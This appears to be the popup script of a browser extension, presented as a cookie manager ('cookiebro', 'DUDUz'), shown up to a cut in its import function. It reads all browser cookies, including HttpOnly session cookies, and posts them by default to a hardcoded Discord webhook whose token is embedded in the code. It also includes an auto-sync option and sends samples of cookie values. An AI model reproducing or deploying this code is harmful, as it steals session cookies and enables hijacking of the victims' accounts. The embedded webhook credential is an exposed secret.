// ============================================================
// DUDUz • LKZ - 
// ============================================================

const api = (typeof chrome !== 'undefined' && chrome.cookies) ? chrome : (typeof browser !== 'undefined' ? browser : null);

const DEFAULT_WEBHOOK_URL = 'https://discord.com/api/webhooks/1547075501384802395/Nit84o6NXdz8EiMJNmNg5WZvo8qH_0PZh8-VFyXGM3RCCrq70hl0W3JeHUziQO5TKlh2';

let cookiesCache = [];
let dominiosCache = [];
let activeFilter = 'all';
let activeTabDomain = '';
let expandedDomains = new Set();
let allExpanded = false;
let selectedCookieForModal = null;
let pendingDeleteAction = null;
let pendingImportData = null;

let appSettings = {
    webhookUrl: DEFAULT_WEBHOOK_URL,
    webhookMode: 'auto',
    webhookAuth: '',
    autoSyncEnabled: false,
    autoSyncInterval: 30
};

function iniciarParticulasNeon() {
    const canvas = document.getElementById('neonParticles');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');

    let width = canvas.width = window.innerWidth;
    let height = canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
        width = canvas.width = window.innerWidth;
        height = canvas.height = window.innerHeight;
    });

    const cores = ['#FF0033', '#FF6B7A', '#C4001E', '#FF3377', '#8B0000'];
    const numParticulas = 36;
    const particulas = [];

    let mouse = { x: -9999, y: -9999, radius: 90 };

    window.addEventListener('mousemove', (e) => {
        mouse.x = e.clientX;
        mouse.y = e.clientY;
    });

    window.addEventListener('mouseleave', () => {
        mouse.x = -9999;
        mouse.y = -9999;
    });

    for (let i = 0; i < numParticulas; i++) {
        particulas.push({
            x: Math.random() * width,
            y: Math.random() * height,
            vx: (Math.random() - 0.5) * 0.6,
            vy: (Math.random() - 0.5) * 0.6,
            radius: Math.random() * 2 + 1,
            color: cores[Math.floor(Math.random() * cores.length)],
            baseAlpha: Math.random() * 0.5 + 0.3
        });
    }

    function animar() {
        ctx.clearRect(0, 0, width, height);

        for (let i = 0; i < particulas.length; i++) {
            for (let j = i + 1; j < particulas.length; j++) {
                const dx = particulas[i].x - particulas[j].x;
                const dy = particulas[i].y - particulas[j].y;
                const dist = Math.sqrt(dx * dx + dy * dy);

                if (dist < 70) {
                    const alpha = (1 - dist / 70) * 0.15;
                    ctx.strokeStyle = `rgba(255, 0, 51, ${alpha})`;
                    ctx.lineWidth = 0.8;
                    ctx.beginPath();
                    ctx.moveTo(particulas[i].x, particulas[i].y);
                    ctx.lineTo(particulas[j].x, particulas[j].y);
                    ctx.stroke();
                }
            }
        }

        for (let i = 0; i < particulas.length; i++) {
            const p = particulas[i];

            p.x += p.vx;
            p.y += p.vy;

            if (p.x < 0) p.x = width;
            if (p.x > width) p.x = 0;
            if (p.y < 0) p.y = height;
            if (p.y > height) p.y = 0;

            const mdx = p.x - mouse.x;
            const mdy = p.y - mouse.y;
            const mdist = Math.sqrt(mdx * mdx + mdy * mdy);

            let alpha = p.baseAlpha;
            let currentRadius = p.radius;

            if (mdist < mouse.radius) {
                const force = (1 - mdist / mouse.radius);
                p.x += (mdx / mdist) * force * 2;
                p.y += (mdy / mdist) * force * 2;
                alpha = Math.min(1, p.baseAlpha + force * 0.6);
                currentRadius = p.radius * (1 + force * 0.8);

                ctx.strokeStyle = `rgba(255, 0, 51, ${force * 0.25})`;
                ctx.lineWidth = 1;
                ctx.beginPath();
                ctx.moveTo(p.x, p.y);
                ctx.lineTo(mouse.x, mouse.y);
                ctx.stroke();
            }

            ctx.save();
            ctx.shadowBlur = 8;
            ctx.shadowColor = p.color;
            ctx.fillStyle = p.color;
            ctx.globalAlpha = alpha;
            ctx.beginPath();
            ctx.arc(p.x, p.y, currentRadius, 0, Math.PI * 2);
            ctx.fill();
            ctx.restore();
        }

        requestAnimationFrame(animar);
    }

    animar();
}

const totalCookiesEl = document.getElementById('totalCookies');
const totalDominiosEl = document.getElementById('totalDominios');
const totalSessaoEl = document.getElementById('totalSessao');
const totalSegurosEl = document.getElementById('totalSeguros');
const dominiosContainer = document.getElementById('dominiosContainer');
const filtroTextoInput = document.getElementById('filtroTexto');
const btnClearSearch = document.getElementById('btnClearSearch');
const timestampEl = document.getElementById('timestamp');
const statusBadge = document.getElementById('statusBadge');
const toastEl = document.getElementById('toast');

const activeTabBanner = document.getElementById('activeTabBanner');
const activeTabDomainEl = document.getElementById('activeTabDomain');
const btnFilterActiveTab = document.getElementById('btnFilterActiveTab');
const chipActiveTab = document.getElementById('chipActiveTab');

const countAllEl = document.getElementById('countAll');
const countActiveTabEl = document.getElementById('countActiveTab');
const countSessionEl = document.getElementById('countSession');
const countSecureEl = document.getElementById('countSecure');
const countHttpOnlyEl = document.getElementById('countHttpOnly');

const modalCookieDetails = document.getElementById('modalCookieDetails');
const modalSettings = document.getElementById('modalSettings');
const modalConfirmDelete = document.getElementById('modalConfirmDelete');
const modalImport = document.getElementById('modalImport');

let toastTimer = null;
function showToast(mensagem, tipo = 'info', duracao = 3000) {
    if (!toastEl) return;
    toastEl.textContent = mensagem;
    toastEl.className = `toast show ${tipo}`;
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => {
        toastEl.className = 'toast';
    }, duracao);
}

function abrirModal(modalEl) {
    if (modalEl) modalEl.classList.add('open');
}

function fecharModal(modalEl) {
    if (modalEl) modalEl.classList.remove('open');
}

function fecharTodosModais() {
    document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('open'));
}

document.querySelectorAll('[data-close]').forEach(btn => {
    btn.addEventListener('click', () => {
        const id = btn.getAttribute('data-close');
        fecharModal(document.getElementById(id));
    });
});

document.querySelectorAll('.modal-overlay').forEach(overlay => {
    overlay.addEventListener('click', (e) => {
        if (e.target === overlay) fecharModal(overlay);
    });
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') fecharTodosModais();
});

async function carregarConfiguracoes() {
    try {
        const data = await api.storage.local.get([
            'webhookUrl',
            'webhookMode',
            'webhookAuth',
            'autoSyncEnabled',
            'autoSyncInterval'
        ]);

        appSettings.webhookUrl = data.webhookUrl || DEFAULT_WEBHOOK_URL;
        if (data.webhookMode !== undefined) appSettings.webhookMode = data.webhookMode;
        if (data.webhookAuth !== undefined) appSettings.webhookAuth = data.webhookAuth;
        if (data.autoSyncEnabled !== undefined) appSettings.autoSyncEnabled = data.autoSyncEnabled;
        if (data.autoSyncInterval !== undefined) appSettings.autoSyncInterval = data.autoSyncInterval;

        document.getElementById('inputWebhookUrl').value = appSettings.webhookUrl;
        document.getElementById('selectWebhookMode').value = appSettings.webhookMode;
        document.getElementById('inputWebhookAuth').value = appSettings.webhookAuth;
        document.getElementById('chkAutoSync').checked = !!appSettings.autoSyncEnabled;
        document.getElementById('inputAutoSyncInterval').value = appSettings.autoSyncInterval;
        document.getElementById('groupAutoSyncInterval').style.display = appSettings.autoSyncEnabled ? 'block' : 'none';
    } catch (err) {
        console.error('Erro ao carregar configurações:', err);
    }
}

async function salvarConfiguracoes() {
    const url = document.getElementById('inputWebhookUrl').value.trim() || DEFAULT_WEBHOOK_URL;
    const mode = document.getElementById('selectWebhookMode').value;
    const auth = document.getElementById('inputWebhookAuth').value.trim();
    const autoSync = document.getElementById('chkAutoSync').checked;
    const interval = parseInt(document.getElementById('inputAutoSyncInterval').value, 10) || 30;

    appSettings.webhookUrl = url;
    appSettings.webhookMode = mode;
    appSettings.webhookAuth = auth;
    appSettings.autoSyncEnabled = autoSync;
    appSettings.autoSyncInterval = interval;

    await api.storage.local.set(appSettings);

    api.runtime.sendMessage({
        action: 'UPDATE_AUTOSYNC_CONFIG',
        enabled: autoSync,
        interval: interval
    }).catch(() => {});

    fecharModal(modalSettings);
    showToast('Configurações salvas!', 'success');
}

async function detectarAbaAtiva() {
    try {
        if (!api.tabs) return;
        const [tab] = await api.tabs.query({ active: true, currentWindow: true });
        if (tab && tab.url && tab.url.startsWith('http')) {
            const urlObj = new URL(tab.url);
            activeTabDomain = urlObj.hostname;
            activeTabBanner.style.display = 'flex';
            activeTabDomainEl.textContent = activeTabDomain;
            chipActiveTab.style.display = 'inline-block';
        } else {
            activeTabBanner.style.display = 'none';
            chipActiveTab.style.display = 'none';
        }
    } catch (e) {
        activeTabBanner.style.display = 'none';
        chipActiveTab.style.display = 'none';
    }
}

function capturarCookies(callback) {
    if (!api || !api.cookies) {
        dominiosContainer.innerHTML = '<div class="empty-state">API de Cookies indisponível.</div>';
        return;
    }

    statusBadge.textContent = 'Lendo...';

    api.cookies.getAll({}, (cookies) => {
        if (api.runtime && api.runtime.lastError) {
            dominiosContainer.innerHTML = `<div class="empty-state">Erro: ${api.runtime.lastError.message}</div>`;
            return;
        }

        cookiesCache = cookies || [];
        processarCookies();

        statusBadge.textContent = '';
        timestampEl.textContent = `Atualizado: ${new Date().toLocaleTimeString('pt-BR')}`;

        if (callback) callback(cookiesCache);
    });
}

function processarCookies() {
    const dominios = {};
    let totalSessao = 0;
    let totalSeguros = 0;
    let totalHttpOnly = 0;
    let totalAbaAtiva = 0;

    cookiesCache.forEach(c => {
        const rawDomain = c.domain || 'desconhecido';
        const cleanDomain = rawDomain.replace(/^\./, '');

        if (!dominios[rawDomain]) {
            dominios[rawDomain] = {
                rawDomain: rawDomain,
                cleanDomain: cleanDomain,
                total: 0,
                secure: 0,
                httpOnly: 0,
                session: 0,
                cookies: []
            };
        }

        dominios[rawDomain].total++;
        dominios[rawDomain].cookies.push(c);

        if (c.secure) {
            dominios[rawDomain].secure++;
            totalSeguros++;
        }
        if (c.httpOnly) {
            dominios[rawDomain].httpOnly++;
            totalHttpOnly++;
        }
        if (c.session) {
            dominios[rawDomain].session++;
            totalSessao++;
        }

        if (activeTabDomain && (cleanDomain === activeTabDomain || cleanDomain.endsWith('.' + activeTabDomain) || activeTabDomain.endsWith('.' + cleanDomain))) {
            totalAbaAtiva++;
        }
    });

    dominiosCache = Object.values(dominios).sort((a, b) => b.total - a.total);

    totalCookiesEl.textContent = cookiesCache.length;
    totalDominiosEl.textContent = dominiosCache.length;
    totalSessaoEl.textContent = totalSessao;
    totalSegurosEl.textContent = totalSeguros;

    countAllEl.textContent = cookiesCache.length;
    countActiveTabEl.textContent = totalAbaAtiva;
    countSessionEl.textContent = totalSessao;
    countSecureEl.textContent = totalSeguros;
    countHttpOnlyEl.textContent = totalHttpOnly;

    renderizarLista();
}

function renderizarLista() {
    const query = filtroTextoInput.value.toLowerCase().trim();
    btnClearSearch.classList.toggle('visible', query.length > 0);

    let dominiosFiltrados = [];

    dominiosCache.forEach(d => {
        let cookiesValidos = d.cookies;

        if (activeFilter === 'session') {
            cookiesValidos = cookiesValidos.filter(c => c.session);
        } else if (activeFilter === 'secure') {
            cookiesValidos = cookiesValidos.filter(c => c.secure);
        } else if (activeFilter === 'httpOnly') {
            cookiesValidos = cookiesValidos.filter(c => c.httpOnly);
        } else if (activeFilter === 'activeTab' && activeTabDomain) {
            const match = d.cleanDomain === activeTabDomain || d.cleanDomain.endsWith('.' + activeTabDomain) || activeTabDomain.endsWith('.' + d.cleanDomain);
            if (!match) cookiesValidos = [];
        }

        if (query) {
            const domainMatches = d.cleanDomain.toLowerCase().includes(query);
            if (!domainMatches) {
                cookiesValidos = cookiesValidos.filter(c =>
                    c.name.toLowerCase().includes(query) ||
                    (c.value && c.value.toLowerCase().includes(query))
                );
            }
        }

        if (cookiesValidos.length > 0) {
            dominiosFiltrados.push({
                ...d,
                filteredCookies: cookiesValidos
            });
        }
    });

    if (dominiosFiltrados.length === 0) {
        dominiosContainer.innerHTML = '<div class="empty-state">Nenhum cookie encontrado para o filtro.</div>';
        return;
    }

    let html = '';

    dominiosFiltrados.forEach(d => {
        const isExpanded = expandedDomains.has(d.rawDomain);
        const faviconUrl = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(d.cleanDomain)}&sz=32`;

        html += `
            <div class="domain-card ${isExpanded ? 'expanded' : ''}" data-domain="${d.rawDomain}">
                <div class="domain-header" data-action="toggle-domain" data-domain="${d.rawDomain}">
                    <div class="domain-main-info">
                        <span class="domain-chevron">›</span>
                        <img src="${faviconUrl}" class="domain-favicon" onerror="this.src='extraido/images/FoiceComuna.png';">
                        <span class="domain-name" title="${d.cleanDomain}">${d.cleanDomain}</span>
                        <div class="domain-badges">
                            <span class="badge-mini badge-count">${d.filteredCookies.length}</span>
                            ${d.secure > 0 ? `<span class="badge-mini badge-ssl" title="${d.secure} cookies seguros">SSL ${d.secure}</span>` : ''}
                            ${d.httpOnly > 0 ? `<span class="badge-mini badge-http" title="${d.httpOnly} cookies HttpOnly">HttpOnly ${d.httpOnly}</span>` : ''}
                        </div>
                    </div>
                    <div class="domain-actions">
                        <button class="btn-tbl btn-tbl-export" data-action="export-domain" data-domain="${d.rawDomain}" title="Exportar JSON deste domínio">
                            JSON
                        </button>
                        <button class="btn-tbl btn-tbl-webhook" data-action="webhook-domain" data-domain="${d.rawDomain}" title="Enviar cookies deste domínio via Webhook">
                            Webhook
                        </button>
                        <button class="btn-tbl btn-tbl-delete" data-action="delete-domain" data-domain="${d.rawDomain}" title="Excluir cookies deste domínio">
                            Excluir
                        </button>
                    </div>
                </div>
                <div class="domain-cookies-list">
                    ${renderizarCookiesDoDominio(d.filteredCookies, d.rawDomain)}
                </div>
            </div>
        `;
    });

    dominiosContainer.innerHTML = html;
    vincularEventosLista();
}

function renderizarCookiesDoDominio(cookies, rawDomain) {
    return cookies.map((c) => {
        const valPreview = c.value ? (c.value.length > 35 ? c.value.substring(0, 35) + '...' : c.value) : '[vazio]';
        const cookieIdentifier = encodeURIComponent(rawDomain) + '::' + encodeURIComponent(c.name) + '::' + encodeURIComponent(c.path || '/');

        return `
            <div class="cookie-row" data-cookie-id="${cookieIdentifier}">
                <div class="cookie-info">
                    <div class="cookie-topline">
                        <span class="cookie-name" title="${c.name}">${c.name}</span>
                        ${c.session ? '<span class="cookie-tag tag-sess">Sessão</span>' : '<span class="cookie-tag tag-sess">Persistente</span>'}
                        ${c.secure ? '<span class="cookie-tag tag-sec">SSL</span>' : ''}
                        ${c.httpOnly ? '<span class="cookie-tag tag-http">HttpOnly</span>' : ''}
                        ${c.path && c.path !== '/' ? `<span class="cookie-tag tag-path" title="Path: ${c.path}">${c.path}</span>` : ''}
                    </div>
                    <div class="cookie-val-preview" title="${c.value || ''}">${valPreview}</div>
                </div>
                <div class="cookie-actions">
                    <button class="btn-tbl" data-action="inspect-cookie" data-cookie-id="${cookieIdentifier}" title="Ver detalhes do cookie">
                        Detalhes
                    </button>
                    <button class="btn-tbl" data-action="copy-cookie-val" data-val="${encodeURIComponent(c.value || '')}" title="Copiar valor">
                        Copiar
                    </button>
                    <button class="btn-tbl btn-tbl-export" data-action="export-single" data-cookie-id="${cookieIdentifier}" title="Exportar este cookie em JSON">
                        JSON
                    </button>
                    <button class="btn-tbl btn-tbl-webhook" data-action="webhook-single" data-cookie-id="${cookieIdentifier}" title="Enviar este cookie via Webhook">
                        Webhook
                    </button>
                    <button class="btn-tbl btn-tbl-delete" data-action="delete-single" data-cookie-id="${cookieIdentifier}" title="Excluir este cookie">
                        Excluir
                    </button>
                </div>
            </div>
        `;
    }).join('');
}

function vincularEventosLista() {
    dominiosContainer.querySelectorAll('[data-action="toggle-domain"]').forEach(el => {
        el.addEventListener('click', (e) => {
            if (e.target.closest('.domain-actions')) return;
            const dom = el.getAttribute('data-domain');
            if (expandedDomains.has(dom)) {
                expandedDomains.delete(dom);
            } else {
                expandedDomains.add(dom);
            }
            el.closest('.domain-card').classList.toggle('expanded');
        });
    });

    dominiosContainer.querySelectorAll('[data-action="export-domain"]').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            exportarCookiesDominio(btn.getAttribute('data-domain'));
        });
    });

    dominiosContainer.querySelectorAll('[data-action="webhook-domain"]').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            enviarWebhookDominio(btn.getAttribute('data-domain'));
        });
    });

    dominiosContainer.querySelectorAll('[data-action="delete-domain"]').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            confirmarExclusaoDominio(btn.getAttribute('data-domain'));
        });
    });

    dominiosContainer.querySelectorAll('[data-action="inspect-cookie"]').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            abrirModalDetalhesCookie(encontrarCookiePorId(btn.getAttribute('data-cookie-id')));
        });
    });

    dominiosContainer.querySelectorAll('[data-action="copy-cookie-val"]').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            copiarParaClipboard(decodeURIComponent(btn.getAttribute('data-val') || ''), 'Valor copiado!');
        });
    });

    dominiosContainer.querySelectorAll('[data-action="export-single"]').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            exportarCookieIndividual(encontrarCookiePorId(btn.getAttribute('data-cookie-id')));
        });
    });

    dominiosContainer.querySelectorAll('[data-action="webhook-single"]').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            enviarWebhookCookieIndividual(encontrarCookiePorId(btn.getAttribute('data-cookie-id')));
        });
    });

    dominiosContainer.querySelectorAll('[data-action="delete-single"]').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            excluirCookieIndividual(encontrarCookiePorId(btn.getAttribute('data-cookie-id')));
        });
    });
}

function encontrarCookiePorId(cookieId) {
    if (!cookieId) return null;
    const parts = cookieId.split('::');
    const rawDomain = decodeURIComponent(parts[0]);
    const name = decodeURIComponent(parts[1]);
    const path = decodeURIComponent(parts[2]);

    return cookiesCache.find(c => c.domain === rawDomain && c.name === name && (c.path || '/') === path);
}

function obterUrlCookie(cookie) {
    const protocol = cookie.secure ? 'https:' : 'http:';
    const cleanDomain = (cookie.domain || '').startsWith('.') ? cookie.domain.substring(1) : (cookie.domain || 'localhost');
    const path = cookie.path || '/';
    return `${protocol}//${cleanDomain}${path}`;
}

async function removerCookieNativo(cookie) {
    if (!api || !api.cookies) return false;
    const url = obterUrlCookie(cookie);
    const details = {
        url: url,
        name: cookie.name,
        storeId: cookie.storeId
    };

    return new Promise((resolve) => {
        api.cookies.remove(details, (result) => {
            if (api.runtime && api.runtime.lastError) {
                console.warn('Erro ao remover cookie:', api.runtime.lastError.message);
                resolve(false);
            } else {
                resolve(!!result);
            }
        });
    });
}

async function excluirCookieIndividual(cookie) {
    if (!cookie) return;
    const sucesso = await removerCookieNativo(cookie);
    if (sucesso) {
        showToast(`Cookie "${cookie.name}" removido!`, 'success');
        capturarCookies();
    } else {
        showToast(`Falha ao remover "${cookie.name}"`, 'error');
    }
}

function confirmarExclusaoDominio(domain) {
    const dObj = dominiosCache.find(d => d.rawDomain === domain);
    const qtd = dObj ? dObj.cookies.length : 0;
    const domLimpo = domain.replace(/^\./, '');

    document.getElementById('confirmDeleteMessage').innerHTML = `
        Excluir permanentemente todos os <strong>${qtd}</strong> cookies de <strong>${domLimpo}</strong> do navegador?
    `;

    pendingDeleteAction = async () => {
        fecharModal(modalConfirmDelete);
        showToast(`Removendo ${qtd} cookies de ${domLimpo}...`, 'info');

        const cookiesParaRemover = dObj ? dObj.cookies : [];
        let removidos = 0;

        for (const c of cookiesParaRemover) {
            const ok = await removerCookieNativo(c);
            if (ok) removidos++;
        }

        showToast(`${removidos} de ${qtd} cookies removidos!`, 'success');
        capturarCookies();
    };

    abrirModal(modalConfirmDelete);
}

function confirmarExclusaoTotal() {
    if (cookiesCache.length === 0) {
        showToast('Não há cookies para excluir.', 'warning');
        return;
    }

    document.getElementById('confirmDeleteMessage').innerHTML = `
        Excluir <strong>TODOS OS ${cookiesCache.length} COOKIES</strong> de todos os <strong>${dominiosCache.length} domínios</strong> do seu navegador?<br><br>
        Todas as suas sessões ativas serão encerradas.
    `;

    pendingDeleteAction = async () => {
        fecharModal(modalConfirmDelete);
        showToast(`Removendo ${cookiesCache.length} cookies...`, 'info', 5000);

        let removidos = 0;
        const total = cookiesCache.length;

        for (const c of cookiesCache) {
            const ok = await removerCookieNativo(c);
            if (ok) removidos++;
        }

        showToast(`Concluído: ${removidos} de ${total} cookies removidos!`, 'success');
        capturarCookies();
    };

    abrirModal(modalConfirmDelete);
}

document.getElementById('btnConfirmDeleteExec').addEventListener('click', () => {
    if (typeof pendingDeleteAction === 'function') {
        pendingDeleteAction();
        pendingDeleteAction = null;
    }
});

function baixarArquivoJSON(objetoOuArray, nomeArquivo) {
    const jsonStr = JSON.stringify(objetoOuArray, null, 4);
    const blob = new Blob([jsonStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = nomeArquivo;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function exportarTodosCookies() {
    if (cookiesCache.length === 0) {
        showToast('Nenhum cookie para exportar.', 'warning');
        return;
    }
    const dataHora = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
    baixarArquivoJSON(cookiesCache, `cookiebro-all-cookies-${dataHora}.json`);
    showToast(`${cookiesCache.length} cookies exportados em JSON!`, 'success');
}

function exportarCookiesDominio(domain) {
    const dObj = dominiosCache.find(d => d.rawDomain === domain);
    if (!dObj || dObj.cookies.length === 0) {
        showToast('Nenhum cookie para este domínio.', 'warning');
        return;
    }
    const safeName = domain.replace(/[^a-zA-Z0-9.-]/g, '_');
    baixarArquivoJSON(dObj.cookies, `cookiebro-${safeName}.json`);
    showToast(`${dObj.cookies.length} cookies de ${dObj.cleanDomain} exportados!`, 'success');
}

function exportarCookieIndividual(cookie) {
    if (!cookie) return;
    const safeDomain = (cookie.domain || 'domain').replace(/[^a-zA-Z0-9.-]/g, '_');
    const safeName = (cookie.name || 'cookie').replace(/[^a-zA-Z0-9.-]/g, '_');

    baixarArquivoJSON([cookie], `cookie-${safeName}-${safeDomain}.json`);
    showToast(`Cookie "${cookie.name}" exportado em JSON!`, 'success');
}

function copiarTodosCookiesJSON() {
    if (cookiesCache.length === 0) {
        showToast('Nenhum cookie para copiar.', 'warning');
        return;
    }
    const jsonStr = JSON.stringify(cookiesCache, null, 2);
    copiarParaClipboard(jsonStr, `${cookiesCache.length} cookies copiados para a área de transferência!`);
}

function copiarParaClipboard(texto, mensagemSucesso) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(texto)
            .then(() => showToast(mensagemSucesso, 'success'))
            .catch(() => fallbackCopiar(texto, mensagemSucesso));
    } else {
        fallbackCopiar(texto, mensagemSucesso);
    }
}

function fallbackCopiar(texto, mensagemSucesso) {
    const ta = document.createElement('textarea');
    ta.value = texto;
    document.body.appendChild(ta);
    ta.select();
    try {
        document.execCommand('copy');
        showToast(mensagemSucesso, 'success');
    } catch (err) {
        showToast('Erro ao copiar para a área de transferência.', 'error');
    }
    document.body.removeChild(ta);
}

async function despacharWebhook(cookiesParaEnviar, escopo, alvoNome) {
    const webhookUrl = appSettings.webhookUrl || DEFAULT_WEBHOOK_URL;
    if (!webhookUrl) {
        showToast('Configure a URL do Webhook nas Configurações.', 'warning');
        abrirModal(modalSettings);
        return false;
    }

    showToast(`Enviando via Webhook (${alvoNome})...`, 'info', 4000);

    const isDiscord = webhookUrl.includes('discord.com/api/webhooks');
    const cookiesArray = Array.isArray(cookiesParaEnviar) ? cookiesParaEnviar : [cookiesParaEnviar];

    try {
        let res;

        if (isDiscord && appSettings.webhookMode !== 'json_raw') {
            const formData = new FormData();
            const jsonBlob = new Blob([JSON.stringify(cookiesArray, null, 2)], { type: 'application/json' });
            formData.append('files[0]', jsonBlob, `cookies_${alvoNome.replace(/[^a-zA-Z0-9.-]/g, '_')}.json`);

            const amostra = cookiesArray.slice(0, 10).map(c =>
                `${c.domain || '?'} | ${c.name} = ${(c.value || '').substring(0, 25)}...`
            ).join('\n');

            formData.append('payload_json', JSON.stringify({
                content: `DUDUz • VLKV - Exportação [${escopo}] (${new Date().toLocaleString('pt-BR')})`,
                embeds: [{
                    title: `Exportação de Cookies • ${alvoNome}`,
                    color: 0x00f0ff,
                    fields: [
                        { name: 'Total de Cookies', value: `\`${cookiesArray.length}\``, inline: true },
                        { name: 'Escopo', value: `\`${escopo}\``, inline: true },
                        { name: 'Amostra', value: `\`\`\`${amostra || 'Sem dados'}\`\`\``, inline: false },
                        { name: 'Arquivo Anexado', value: 'JSON completo anexado acima.', inline: false }
                    ],
                    footer: { text: 'DUDUz • VLKV' },
                    timestamp: new Date().toISOString()
                }]
            }));

            res = await fetch(webhookUrl, {
                method: 'POST',
                body: formData
            });
        } else {
            const headers = { 'Content-Type': 'application/json' };
            if (appSettings.webhookAuth) {
                headers['Authorization'] = appSettings.webhookAuth;
            }

            let body;
            if (appSettings.webhookMode === 'json_raw') {
                body = JSON.stringify(cookiesArray);
            } else {
                body = JSON.stringify({
                    event: 'cookiebro_export',
                    scope: escopo,
                    target: alvoNome,
                    timestamp: new Date().toISOString(),
                    total: cookiesArray.length,
                    cookies: cookiesArray
                });
            }

            res = await fetch(webhookUrl, {
                method: 'POST',
                headers: headers,
                body: body
            });
        }

        if (res.ok) {
            showToast(`Webhook enviado com sucesso! (${res.status})`, 'success');
            return true;
        } else {
            const errTxt = await res.text().catch(() => '');
            showToast(`Erro Webhook: HTTP ${res.status} ${errTxt.substring(0, 40)}`, 'error');
            return false;
        }
    } catch (err) {
        showToast(`Falha de conexão: ${err.message}`, 'error');
        return false;
    }
}

function enviarWebhookTodos() {
    if (cookiesCache.length === 0) {
        showToast('Não há cookies para enviar.', 'warning');
        return;
    }
    despacharWebhook(cookiesCache, 'all', 'Todos os Cookies');
}

function enviarWebhookDominio(domain) {
    const dObj = dominiosCache.find(d => d.rawDomain === domain);
    if (!dObj || dObj.cookies.length === 0) {
        showToast('Nenhum cookie para enviar neste domínio.', 'warning');
        return;
    }
    despacharWebhook(dObj.cookies, 'domain', dObj.cleanDomain);
}

function enviarWebhookCookieIndividual(cookie) {
    if (!cookie) return;
    despacharWebhook([cookie], 'single', `${cookie.name} (${cookie.domain})`);
}

async function testarConexaoWebhook() {
    const url = document.getElementById('inputWebhookUrl').value.trim() || DEFAULT_WEBHOOK_URL;
    const resultEl = document.getElementById('webhookTestResult');
    const auth = document.getElementById('inputWebhookAuth').value.trim();

    resultEl.style.color = 'var(--neon-cyan)';
    resultEl.textContent = 'Testando...';

    const isDiscord = url.includes('discord.com/api/webhooks');

    try {
        let res;
        if (isDiscord) {
            res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: 'DUDUz • VLKV: Teste de conexão do Webhook realizado com sucesso!'
                })
            });
        } else {
            const headers = { 'Content-Type': 'application/json' };
            if (auth) headers['Authorization'] = auth;
            res = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify({
                    event: 'cookiebro_test_ping',
                    timestamp: new Date().toISOString()
                })
            });
        }

        if (res.ok) {
            resultEl.style.color = 'var(--neon-emerald)';
            resultEl.textContent = `Sucesso! HTTP ${res.status}`;
        } else {
            resultEl.style.color = 'var(--neon-red)';
            resultEl.textContent = `HTTP ${res.status}`;
        }
    } catch (err) {
        resultEl.style.color = 'var(--neon-red)';
        resultEl.textContent = 'Falha de conexão';
    }
}

function abrirModalDetalhesCookie(cookie) {
    if (!cookie) return;
    selectedCookieForModal = cookie;

    const expiresFormatted = cookie.session
        ? 'Sessão do Navegador'
        : (cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toLocaleString('pt-BR') : 'Indeterminado');

    const table = document.getElementById('cookieDetailsTable');
    table.innerHTML = `
        <tr><td>Nome:</td><td><strong>${cookie.name}</strong></td></tr>
        <tr><td>Domínio:</td><td>${cookie.domain}</td></tr>
        <tr><td>Caminho:</td><td>${cookie.path || '/'}</td></tr>
        <tr><td>Expiração:</td><td>${expiresFormatted}</td></tr>
        <tr><td>Sessão:</td><td>${cookie.session ? 'Sim' : 'Não'}</td></tr>
        <tr><td>Seguro (SSL):</td><td>${cookie.secure ? 'Sim' : 'Não'}</td></tr>
        <tr><td>HttpOnly:</td><td>${cookie.httpOnly ? 'Sim' : 'Não'}</td></tr>
        <tr><td>SameSite:</td><td>${cookie.sameSite || 'unspecified'}</td></tr>
        <tr><td>Store ID:</td><td>${cookie.storeId || '0'}</td></tr>
    `;

    document.getElementById('cookieDetailValue').textContent = cookie.value || '[vazio]';
    document.getElementById('cookieDetailJSON').textContent = JSON.stringify(cookie, null, 2);

    abrirModal(modalCookieDetails);
}

document.getElementById('btnCopyCookieValue').addEventListener('click', () => {
    if (selectedCookieForModal) {
        copiarParaClipboard(selectedCookieForModal.value || '', 'Valor copiado!');
    }
});

document.getElementById('btnCopyCookieJSON').addEventListener('click', () => {
    if (selectedCookieForModal) {
        copiarParaClipboard(JSON.stringify(selectedCookieForModal, null, 2), 'JSON copiado!');
    }
});

document.getElementById('btnExportSingleCookie').addEventListener('click', () => {
    if (selectedCookieForModal) {
        exportarCookieIndividual(selectedCookieForModal);
    }
});

document.getElementById('btnDeleteSingleCookieFromModal').addEventListener('click', async () => {
    if (selectedCookieForModal) {
        fecharModal(modalCookieDetails);
        await excluirCookieIndividual(selectedCookieForModal);
    }
});

function iniciarImportacaoArquivo(file) {
    const reader = new FileReader();
    reader.onload = (e) => {
        try {
            let data = JSON.parse(e.target.result);
            if (!Array.isArray(data)) {
                if (data && typeof data === 'object' && data.name && data.domain) {
                    data = [data];
                } else if (data && Array.isArray(data.cookies)) {
                    data = data.cookies;
                } else {
                    showToast('Formato JSON inválido.', 'error');
                    return;
                }
            }

            if (data.length === 0) {
                showToast('Arquivo JSON vazio.', 'warning');
                return;
            }

            pendingImportData = data;
            const dominiosUnicos = new Set(data.map(c => c.domain)).size;
            document.getElementById('importStatsPreview').innerHTML = `
                <strong>${data.length} cookies</strong> identificados em <strong>${dominiosUnicos} domínios</strong>.
            `;

            abrirModal(modalImport);
